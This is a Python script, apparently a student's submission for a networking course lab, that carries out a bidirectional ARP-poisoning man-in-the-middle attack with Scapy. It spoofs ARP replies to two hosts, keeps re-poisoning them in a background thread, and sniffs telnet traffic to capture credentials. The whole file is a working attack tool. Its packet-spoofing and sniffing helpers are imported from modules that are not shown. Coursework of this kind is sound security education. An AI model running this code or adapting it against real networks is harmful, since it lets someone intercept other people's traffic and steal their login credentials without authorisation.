#!/usr/bin/env python3
# ==============================================================================
# File Name:     mitm.py
# Author:        Eva Tate and Giselle Wu
# Course:        CS60: Computer Networks
# Assignment:    Lab 1: Packet sniffing and spoofing
# Date:          September 29, 2026
#
# Description:   Full bidirectional ARP-poisoning Man-in-the-Middle attack
#                described in Lab 1, Exercise 4, step 3: poisons Host A's
#                and Host B's ARP tables so both point the other's IP at
#                the attacker's MAC, then sniffs the telnet credentials
#                that cross the attacker's interface.
#
# ==============================================================================

"""ARP-poisoning MITM tool using Scapy.

Usage:
    sudo python3 mitm.py <iface> <hostA_ip> <hostA_mac> <hostB_ip> <hostB_mac> [repoison_interval_sec]

This poisons Host A to believe Host B's IP is at the attacker's MAC, and
poisons Host B to believe Host A's IP is at the attacker's MAC, then
periodically re-sends the spoofed ARP replies (real ARP traffic between A
and B, or entry timeouts, would otherwise heal the tables) while sniffing
telnet keystrokes crossing the attacker's interface.
"""

import sys
import threading
import time

from scapy.arch import get_if_hwaddr

from arp_spoof import poison
from telnet_sniffer import handle_packet
from scapy.sendrecv import sniff

REPOISON_INTERVAL_DEFAULT = 5  # seconds


def repoison_loop(stop_event, iface, attacker_mac, hostA_ip, hostA_mac, hostB_ip, hostB_mac, interval):
    while not stop_event.wait(interval):
        poison(iface, attacker_mac, hostA_mac, hostA_ip, hostB_ip, sleep_sec=0)
        poison(iface, attacker_mac, hostB_mac, hostB_ip, hostA_ip, sleep_sec=0)


def main():
    if len(sys.argv) not in (6, 7):
        print(
            f"Usage: sudo python3 {sys.argv[0]} "
            "<iface> <hostA_ip> <hostA_mac> <hostB_ip> <hostB_mac> [repoison_interval_sec]"
        )
        sys.exit(1)

    iface, hostA_ip, hostA_mac, hostB_ip, hostB_mac = sys.argv[1:6]
    interval = float(sys.argv[6]) if len(sys.argv) == 7 else REPOISON_INTERVAL_DEFAULT
    attacker_mac = get_if_hwaddr(iface)

    print(f"[*] Attacker MAC on {iface}: {attacker_mac}")

    print(f"[1] Poisoning Host A ({hostA_ip}): telling it Host B ({hostB_ip}) is at {attacker_mac}")
    poison(iface, attacker_mac, hostA_mac, hostA_ip, hostB_ip)

    print(f"[2] Poisoning Host B ({hostB_ip}): telling it Host A ({hostA_ip}) is at {attacker_mac}")
    poison(iface, attacker_mac, hostB_mac, hostB_ip, hostA_ip)

    print(f"[*] MITM established. Re-poisoning every {interval}s in the background.")
    print("[*] Sniffing telnet traffic between Host A and Host B (Ctrl+C to stop)...\n")

    stop_event = threading.Event()
    t = threading.Thread(
        target=repoison_loop,
        args=(stop_event, iface, attacker_mac, hostA_ip, hostA_mac, hostB_ip, hostB_mac, interval),
        daemon=True,
    )
    t.start()

    try:
        sniff(filter="tcp port 23", iface=iface, prn=handle_packet, store=False)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()


if __name__ == "__main__":
    main()
